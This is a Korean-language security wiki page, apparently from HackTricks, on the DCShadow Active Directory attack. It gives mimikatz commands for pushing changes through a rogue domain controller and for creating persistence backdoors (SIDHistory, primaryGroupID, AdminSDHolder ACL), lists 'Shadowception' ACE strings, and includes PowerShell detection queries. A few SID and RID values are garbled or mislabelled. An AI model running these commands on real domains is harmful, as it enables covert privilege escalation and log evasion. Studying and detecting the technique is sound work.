# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

AD에 **new Domain Controller**를 등록하고 이를 사용해 지정된 객체에 **attributes**(SIDHistory, SPNs...)를 **push**하며, **modifications**에 관한 어떠한 **logs**도 **leaving**하지 않습니다. **DA** privileges가 필요하며 **root domain** 내부에 있어야 합니다.\
잘못된 데이터를 사용하면 상당히 좋지 않은 logs가 남는다는 점에 유의하세요.<sup>[[2]](#references)</sup>

공격을 수행하려면 2개의 mimikatz 인스턴스가 필요합니다. 그중 하나는 SYSTEM privileges로 RPC servers를 시작하고(여기서 수행하려는 changes를 지정해야 합니다), 다른 인스턴스는 values를 push하는 데 사용됩니다:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
`mimikatz1` session에서는 **`elevate::token`**이 작동하지 않는다는 점에 유의하세요. 이는 thread의 privileges를 elevate하지만, 필요한 것은 **process의 privilege**를 elevate하는 것이기 때문입니다.\
또한 다음과 같이 "LDAP" object를 선택할 수 있습니다: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

DA 또는 다음과 같은 최소 permissions를 가진 user로 changes를 push할 수 있습니다:

- **domain object**에서:
- _DS-Install-Replica_ (Domain에서 Replica 추가/제거)
- _DS-Replication-Manage-Topology_ (Replication Topology 관리)
- _DS-Replication-Synchronize_ (Replication Synchronization)
- **Configuration container**의 **Sites object**(및 해당 children):
- _CreateChild and DeleteChild_
- DC로 등록된 **computer object**:
- _WriteProperty_ (Write 아님)
- **target object**:
- _WriteProperty_ (Write 아님)

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)을 사용하여 권한이 없는 user에게 이러한 privileges를 부여할 수 있습니다(단, 이 작업은 일부 logs를 남긴다는 점에 유의하세요). 이는 DA privileges를 보유하는 것보다 훨씬 더 제한적입니다.\
예: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 이는 machine _**mcorp-student1**_에 로그인한 username _**student1**_이 object _**root1user**_에 대한 DCShadow permissions를 갖는다는 의미입니다.

## DCShadow를 사용하여 backdoors 생성
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group abuse, enumeration gaps, and detection

- `primaryGroupID`는 group의 `member` list와 별도의 attribute입니다. DCShadow/DSInternals는 이를 직접 기록할 수 있으며(예: **Domain Admins**에 대해 `primaryGroupID=512` 설정), on-box LSASS enforcement 없이 수행됩니다. 하지만 AD는 여전히 사용자를 **이동**시킵니다. PGID를 변경하면 이전 primary group에서의 membership이 항상 제거되므로(모든 target group에서 동일하게 동작), 기존 primary-group membership을 유지할 수 없습니다.<sup>[[1]](#references)</sup>
- Default tools는 사용자를 현재 primary group에서 제거하지 못하도록 합니다(`ADUC`, `Remove-ADGroupMember`). 따라서 PGID를 변경하려면 일반적으로 direct directory writes(DCShadow/`Set-ADDBPrimaryGroup`)가 필요합니다.
- Membership reporting은 일관되지 않습니다.
- **Primary-group-derived members를 포함:** `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Primary-group-derived members를 제외:** `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit에서 `member` 검사, `Get-ADUser <user> -Properties memberOf`.
- Recursive checks는 **primary group 자체가 nested인 경우** primary-group members를 놓칠 수 있습니다(예: user의 PGID가 Domain Admins 내부의 nested group을 가리키는 경우). `Get-ADGroupMember -Recursive` 또는 LDAP recursive filters는 primary groups를 명시적으로 resolve하지 않는 한 해당 user를 반환하지 않습니다.
- DACL tricks: attackers는 user의 `primaryGroupID`에 대해(또는 AdminSDHolder가 아닌 groups의 `member` attribute에 대해) **deny ReadProperty**를 설정하여 대부분의 PowerShell queries에서 effective membership을 숨길 수 있습니다. `net group`은 여전히 membership을 resolve합니다. AdminSDHolder-protected groups는 이러한 denies를 reset합니다.

Detection/monitoring examples:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
권한이 있는 그룹을 교차 확인하려면 `Get-ADGroupMember` 출력과 `Get-ADGroup -Properties member` 또는 ADSI Edit를 비교하여 `primaryGroupID` 또는 숨겨진 attributes로 인해 발생한 불일치를 찾아냅니다.<sup>[[1]](#references)</sup>

## Shadowception - DCShadow를 사용하여 DCShadow permissions 부여하기 (수정된 permissions 로그 없음)

다음 ACE를 사용자의 SID와 함께 마지막에 추가해야 합니다:<sup>[[2]](#references)</sup>

- 도메인 object에서:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- attacker computer object에서: `(A;;WP;;;UserSID)`
- target user object에서: `(A;;WP;;;UserSID)`
- Configuration container의 Sites object에서: `(A;CI;CCDC;;;UserSID)`

object의 현재 ACE를 가져오려면: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

이 경우에는 하나가 아니라 **여러 변경 사항을** 적용해야 한다는 점에 유의하세요. 따라서 **mimikatz1 session**(RPC server)에서 적용하려는 각 변경 사항마다 **`/stack` parameter**를 사용합니다. 이렇게 하면 rogue server에서 쌓인 모든 변경 사항을 수행하기 위해 **`/push`**를 한 번만 사용하면 됩니다.

[**ired.team의 DCShadow 관련 추가 정보.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Primary Group 동작, Reporting 및 Exploitation에 대한 분석](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [ired.team의 DCShadow write-up](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
